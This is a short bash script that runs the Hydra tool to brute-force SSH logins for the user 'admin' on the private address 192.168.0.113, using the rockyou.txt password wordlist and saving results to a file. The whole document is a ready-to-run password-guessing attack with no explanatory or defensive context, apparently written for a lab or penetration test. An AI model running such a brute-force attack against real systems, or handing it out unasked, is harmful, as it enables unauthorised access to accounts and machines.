#!/bin/bash
echo "[*] Running Hydra SSH brute-force..."
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.113 ssh -t 4 -o hydra_result.txt
echo "[*] Hydra results saved to hydra_result.txt"
